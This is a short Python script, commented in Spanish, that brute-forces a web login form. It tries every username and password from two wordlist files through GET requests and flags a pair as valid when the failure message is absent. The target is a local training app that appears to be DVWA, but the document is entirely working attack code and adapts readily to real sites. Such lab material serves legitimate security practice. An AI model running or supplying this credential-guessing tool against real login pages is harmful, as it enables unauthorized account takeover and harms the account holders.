import requests

# URL base del formulario de inicio de sesión
url = 'http://127.0.0.1:8080/vulnerabilities/brute/index.php'

# Diccionarios de usuarios y contraseñas
users_file = 'users.txt'
passwords_file = 'john.txt'

# Cabeceras HTTP
headers = {
    'Cookie': 'security=low; PHPSESSID=mnfdp1ouojf5fhfrvj8fh0dcd0',  # Aquí va tu PHPSESSID
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36'
}

# Función para realizar el ataque de fuerza bruta
def brute_force_login(url, user, password):
    # Construir la URL con los parámetros del GET
    params = {
        'username': user,
        'password': password,
        'Login': 'Login'
    }
    
    # Enviar la solicitud GET con los parámetros en la URL
    response = requests.get(url, params=params, headers=headers)
    
    # Verificar si el mensaje de éxito está en la respuesta
    if response.status_code == 200 and 'Username and/or password incorrect.' not in response.text:
        return True  # Credenciales válidas
    else:
        return False  # Credenciales inválidas

# Leer los archivos de usuarios y contraseñas
with open(users_file, 'r') as uf, open(passwords_file, 'r') as pf:
    users = uf.read().splitlines()
    passwords = pf.read().splitlines()

# Realizar el ataque de fuerza bruta para encontrar una contraseña válida por usuario
for user in users:
    found = False  # Bandera para saber si se encontró una contraseña válida
    for password in passwords:
        if brute_force_login(url, user, password):
            print(f'¡Credenciales válidas encontradas! Usuario: {user}, Contraseña: {password}')
            found = True  # Marcar como encontrada
            break  # Detener el ciclo de contraseñas para este usuario
    if not found:
        print(f'No se encontraron credenciales válidas para el usuario: {user}')
